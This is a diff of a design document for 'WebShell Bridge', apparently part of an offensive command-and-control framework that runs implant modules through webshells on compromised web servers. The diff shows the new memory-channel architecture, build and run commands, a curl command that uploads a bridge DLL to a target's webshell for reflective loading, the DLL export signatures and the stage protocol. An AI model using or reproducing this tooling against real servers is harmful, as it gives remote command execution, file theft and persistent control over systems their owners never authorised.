@@ -2,11 +2,11 @@
 
 ## Overview
 
-WebShell Bridge enables IoM to operate through webshells (JSP/PHP/ASPX) by establishing a communication channel via suo5 HTTP tunnels. The architecture has three clean layers:
+WebShell Bridge enables IoM to operate through webshells (JSP/PHP/ASPX) using a memory channel architecture. The bridge DLL is loaded into the web server process memory, and the webshell calls DLL exports directly via function pointers — no TCP ports opened on the target.
 
-- **Product layer**: Server sees a `CustomPipeline(type="webshell")`. Operators interact via `webshell new/start/stop/delete` commands. No knowledge of rem/suo5/proxyclient required.
-- **Implementation layer**: Bridge binary runs on the operator machine, managing transport (rem + proxyclient + suo5), session lifecycle, and task forwarding.
-- **Transport layer**: The webshell only handles initial DLL loading and raw HTTP body send/receive. It never parses protocol bytes.
+- **Product layer**: Server sees a `CustomPipeline(type="webshell")`. Operators interact via `webshell new/start/stop/delete` commands.
+- **Implementation layer**: Bridge binary runs on the operator machine, sending HTTP requests to the webshell with `X-Stage` headers.
+- **Transport layer**: The webshell loads the DLL, resolves exports, and calls `bridge_init`/`bridge_process` directly. Pure memory channel.
 
 ## Architecture
 
@@ -27,39 +27,35 @@ Bridge Binary (server/cmd/webshell-bridge/)
 ─────────────────────────────────────────
   Runs on operator machine, connects to Server via ListenerRPC (mTLS)
 
-  ┌─ transport adapter ──────────────────────────────────────┐
-  │  rem (internal, not exposed as product concept)          │
-  │  proxyclient/suo5 (HTTP full-duplex tunnel)              │
-  └──────────────────────────────────────────────────────────┘
+  ┌─ HTTP transport ───────────────────────────────────────┐
+  │  HTTP POST with X-Stage headers to webshell URL        │
+  │  Raw protobuf over HTTP body (no malefic framing)      │
+  └────────────────────────────────────────────────────────┘
 
-  ┌─ spite/session adapter ──────────────────────────────────┐
-  │  SpiteStream ↔ rem channel protocol translation          │
-  │  Session registration, checkin, task routing              │
-  └──────────────────────────────────────────────────────────┘
+  ┌─ spite/session adapter ────────────────────────────────┐
+  │  SpiteStream ↔ HTTP request/response translation       │
+  │  Session registration, checkin, task routing            │
+  └────────────────────────────────────────────────────────┘
 
 
 Target Web Server Process
 ─────────────────────────
   WebShell (JSP/PHP/ASPX)
-    - Initial bridge DLL loading (reflective/memory)
-    - HTTP body send/receive
-    - Pass raw bytes to bridge, no parsing
+    - Bridge DLL loading (ReflectiveLoader)
+    - Export resolution (bridge_init, bridge_process)
+    - X-Stage: spite → call bridge_process() → return response
+    - No port opened, no TCP loopback
 
   Bridge Runtime DLL (in web server process memory)
-    ┌─ transport adapter ─────────────────────────────────┐
-    │  rem server on 127.0.0.1:<port>                     │
-    │  Bridge binary connects as rem client via suo5      │
-    └─────────────────────────────────────────────────────┘
+    ┌─ export interface ────────────────────────────────┐
+    │  bridge_init()    → Register (SysInfo + Modules)  │
+    │  bridge_process() → Spites in/out (protobuf)      │
+    └───────────────────────────────────────────────────┘
 
-    ┌─ spite/session adapter ─────────────────────────────┐
-    │  Receives Spite over rem channel                    │
-    │  Routes to module runtime by spite.Name             │
-    └─────────────────────────────────────────────────────┘
-
-    ┌─ malefic module runtime ────────────────────────────┐
-    │  exec / bof / execute_pe / upload / download / ...  │
-    │  All malefic modules available                      │
-    └─────────────────────────────────────────────────────┘
+    ┌─ malefic module runtime ─────────────────────────┐
+    │  exec / bof / execute_pe / upload / download / ...│
+    │  All malefic modules available                    │
+    └──────────────────────────────────────────────────┘
 ```
 
 ## Data Flow
@@ -67,32 +63,33 @@ Target Web Server Process
 ```
 Client exec("whoami")
   → Server (SpiteStream)
-    → Bridge binary (session adapter)
-      → [rem channel through suo5 HTTP tunnel]
-        → Bridge Runtime DLL (module runtime)
+    → Bridge binary (HTTP POST X-Stage: spite)
+      → WebShell (calls bridge_process via function pointer)
+        → DLL module runtime
           → exec("whoami") → "root"
-        → Spite response over rem channel
-      → [suo5 HTTP tunnel]
+        → Spite response returned from bridge_process
+      → HTTP response body
     → Bridge binary → SpiteStream.Send(response)
   → Server → Client displays "root"
 ```
 
 ## Usage
 
-### 1. Run bridge binary
+### 1. Build and run bridge binary
 
 ```bash
+go build -o webshell-bridge ./server/cmd/webshell-bridge/
+
 webshell-bridge \
   --auth listener.auth \
-  --suo5 suo5://target.com/suo5.jsp \
+  --suo5 suo5://target.com/suo5.aspx \
   --listener my-listener \
-  --pipeline webshell_my-listener \
-  --dll-addr 127.0.0.1:13338
+  --token CHANGE_ME_RANDOM_TOKEN
 ```
 
-The `--dll-addr` flag tells the bridge binary which address to connect to through the suo5 tunnel (default: `127.0.0.1:13338`). This must match the DLL's compiled `DEFAULT_ADDR` in `malefic-bridge-dll/src/lib.rs` and the webshell's status probe port (`BRIDGE_DLL_PORT` in PHP, port constant in ASPX/JSP). Changing the port requires updating all three locations and recompiling the DLL.
+The `--token` must match the `STAGE_TOKEN` constant in the webshell. The suo5 URL is converted to HTTP(S) automatically (`suo5://` → `http://`, `suo5s://` → `https://`).
 
-At startup the bridge registers the listener, opens `JobStream`, and waits for pipeline start/stop/sync control. It does **not** auto-register or auto-start the `CustomPipeline`.
+At startup the bridge registers the listener, opens `JobStream`, and waits for pipeline control messages.
 
 ### 2. Register and start the pipeline from Client/TUI
 
@@ -100,13 +97,19 @@ At startup the bridge registers the listener, opens `JobStream`, and waits for p
 webshell new --listener my-listener
 ```
 
-This creates `CustomPipeline(type="webshell")` and sends the pipeline start control to the already running bridge.
+### 3. Deploy webshell + load bridge DLL
 
-### 3. Deploy suo5 webshell + bridge DLL on target
+Deploy the suo5 webshell (JSP/PHP/ASPX) to the target web server, then send the bridge DLL:
 
-Deploy the suo5 webshell (JSP/PHP/ASPX) to the target web server. The webshell loads the bridge DLL into the web server process memory. The bridge DLL starts a rem server on `127.0.0.1:13338` (or the port matching `--dll-addr`).
+```bash
+curl -X POST \
+  -H "X-Stage: load" \
+  -H "X-Token: CHANGE_ME_RANDOM_TOKEN" \
+  --data-binary @bridge.dll \
+  http://target.com/suo5.aspx
+```
 
-If the DLL is not loaded when the pipeline starts, the bridge keeps retrying `connectDLL` with exponential backoff until the rem server becomes reachable or the retry budget is exhausted.
+The webshell loads the DLL via ReflectiveLoader, then resolves `bridge_init`/`bridge_process` exports from the mapped PE image. If the DLL is not loaded when the pipeline starts, the bridge retries with exponential backoff.
 
 ### 4. Interact
 
@@ -117,40 +120,56 @@ upload /local/file /remote/path
 download /remote/file
 ```
 
-## Rem Channel Protocol
+## Protocol
 
-The bridge binary communicates with the bridge DLL using the rem wire protocol over a TCP connection tunneled through suo5.
+### HTTP Endpoints (X-Stage headers)
 
-### Wire Format
+| Stage | Method | Description |
+|-------|--------|-------------|
+| `load` | POST | Load bridge DLL into memory (body = raw DLL bytes) |
+| `status` | POST | Check if DLL is loaded (returns `LOADED` or `NOT_LOADED`) |
+| `init` | POST | Get Register data from `bridge_init()` (returns `[4B sessionID LE][Register protobuf]`) |
+| `spite` | POST | Process Spites via `bridge_process()` (body/response = serialized `Spites` protobuf) |
 
-Each message: `[1 byte msg_type][4 bytes LE length][protobuf payload]`
+All stage requests require `X-Token` header matching `STAGE_TOKEN`.
 
-Uses `cio.WriteMsg`/`cio.ReadMsg` from `github.com/chainreactors/rem/protocol/cio`.
+### DLL Export Interface
 
-### Session Lifecycle
+The bridge DLL must export these functions:
 
+```c
+// Initialize and return serialized Register protobuf
+// Output format: [4 bytes sessionID LE][Register protobuf bytes]
+int __stdcall bridge_init(
+    uint8_t* out_buf,      // output buffer
+    uint32_t out_cap,      // buffer capacity
+    uint32_t* out_len      // actual bytes written
+);  // returns 0 on success
+
+// Process serialized Spites protobuf, return response Spites
+int __stdcall bridge_process(
+    uint8_t* in_buf,       // input Spites protobuf
+    uint32_t in_len,       // input length
+    uint8_t* out_buf,      // output buffer for response Spites
+    uint32_t out_cap,      // buffer capacity
+    uint32_t* out_len      // actual bytes written
+);  // returns 0 on success
+
+// Optional: cleanup
+int __stdcall bridge_destroy();
 ```
-1. Bridge dials DLL:   transport.Dial("tcp", dllAddr)  [through suo5]
-2. Login handshake:    Login{Agent: id, Mod: "bridge"} → Ack{Status: 1}
-3. DLL sends:          Packet{ID: 0, Data: Marshal(Register{SysInfo, Modules})}
-4. Bridge registers session with server using real SysInfo/Modules
-5. Task exchange:      Packet{ID: taskID, Data: Marshal(Spite)} ↔ bidirectional
-```
 
-### DLL Requirements
-
-The bridge DLL (malefic create branch) must:
-1. Start a rem-compatible TCP listener on the configured port
-2. Accept Login, respond with Ack
-3. Send a handshake Packet{ID: 0} containing serialized `implantpb.Register`
-4. For each received Packet, unmarshal the Spite, execute the module, and reply with a Packet containing the response Spite
+The DLL must also export `ReflectiveLoader` for the loading phase. The webshell uses ReflectiveLoader to map the DLL, then resolves `bridge_init`/`bridge_process` from the mapped image's export table.
 
 ## Key Files
 
 | Purpose | Path |
 |---------|------|
 | Bridge binary | `server/cmd/webshell-bridge/` |
-| Rem channel | `server/cmd/webshell-bridge/channel.go` |
+| Channel (HTTP) | `server/cmd/webshell-bridge/channel.go` |
+| Session management | `server/cmd/webshell-bridge/session.go` |
 | Client commands | `client/command/pipeline/webshell.go` |
 | CustomPipeline (server) | `server/listener/custom.go` |
-| proxyclient/suo5 | `github.com/chainreactors/proxyclient/suo5` |
+| Webshell (ASPX) | `suo5-webshell/suo5.aspx` |
+| Webshell (PHP) | `suo5-webshell/suo5.php` |
+| Webshell (JSP) | `suo5-webshell/suo5.jsp` |
